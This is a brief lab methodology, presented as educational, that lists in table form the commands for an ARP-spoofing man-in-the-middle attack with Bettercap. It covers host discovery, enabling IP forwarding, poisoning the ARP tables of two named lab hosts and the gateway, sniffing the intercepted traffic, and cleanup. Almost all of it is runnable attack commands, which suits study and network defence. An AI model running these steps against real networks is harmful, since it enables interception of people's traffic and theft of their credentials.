Methodology: Man-in-the-Middle (ARP Spoofing) Attack

Performed in a controlled lab environment for educational purposes.

Phase 1 : Host Configuration & Reconnaissance
Step	                         Command	Purpose
1	ip a	                    : Identify the local network interfaces and the attacking machine's IP address.
2	ip route  	              : Display the routing table to determine the default gateway.
3	sudo arp-scan --localnet	: Scan the local subnet to enumerate live hosts and their MAC addresses (target discovery).
Phase 2 : Preparing the Attack
Step	Command	Purpose
4	sudo sysctl -w net.ipv4.ip_forward=1	: Enable IP forwarding so intercepted traffic is relayed to its destination, keeping the victim's connection alive.
Phase 3 : Launching Bettercap
Step	                          Command	Purpose
5	sudo bettercap -iface eth0 : Start Bettercap on the eth0 interface.
6	net.probe on	             : Actively probe the network to populate the host list.
7	net.show	                 : Display discovered hosts, IPs, and MAC addresses to confirm targets.
Phase 4 : ARP Spoofing
Step	                                                 Command	Purpose
8	set arp.spoof.targets 10.73.147.200,10.73.147.181	: Define the victim host(s) to be spoofed.
	set arp.spoof.fullduplex true	:                     Spoof both the targets and the gateway so traffic is intercepted in both directions.
	arp.spoof on	:                                     Begin the ARP poisoning attack.
Phase 5 : Traffic Interception
Step            	Command	Purpose
9	net.sniff on	: Capture and inspect the traffic now flowing through the attacking machine.
Phase 6 : Cleanup
Step              	Command	Purpose
10	arp.spoof off	: Stop the attack and restore the correct ARP table entries on the targets.
